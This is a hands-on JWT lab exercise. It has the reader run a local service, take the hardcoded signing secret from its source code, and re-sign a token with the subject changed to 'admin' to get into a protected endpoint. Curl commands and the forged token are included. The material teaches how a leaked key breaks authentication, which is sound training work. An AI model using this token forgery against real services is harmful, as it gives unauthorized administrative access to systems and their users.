*** JWT Exercise ***

In this exercise you will run a service with an endpoint that required JWT token authentication, and tamper with the token by obtaining the encryption key. 

1. Open VS Code in the top directory and press F5, the service should start on http://127.0.0.1:5000

2. Use Postman or Curl to log in and obtain a token:

curl http://127.0.0.1:5000/login -d '{"username":"aaa"}' -H 'Content-type: application/json'

You should get a response with the token:

{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhYWEifQ.GtR_E9CGfbQ9LexhZDVDON6ubNfQouN9xAcblK0dtLg"
}

Use the token to access /protected endpoint:

curl http://127.0.0.1:5000/protected -H 'Authorization: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhYWEifQ.GtR_E9CGfbQ9LexhZDVDON6ubNfQouN9xAcblK0dtLg'
{
  "message": "Access granted",
  "token": {
    "sub": "aaa"
  }
}

4. Go to https://jwt.io and paste the token. Try to understand the decoded JWT.

5. Get the secret key from the code in jwt-demo.py and paste it in the "verify signature" form of jwt.io

6. Make sure that it says "signature verified"

7. Change the sub field in the payload data to "admin",  the base64 encoded token will change and the signature will still be verified. 

8. Use the token to access /protected endpoint:

curl http://127.0.0.1:5000/protected -H 'Authorization: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.O2WAU_blrKzNYAHMC9CVWrM5YHe77sh05Qg0Yzyrb3c'
{
  "message": "Access granted",
  "token": {
    "sub": "admin"
  }
}




url http://127.0.0.1:5000/login -d '{"username":"aaa"}' -H 'Content-type: application/json'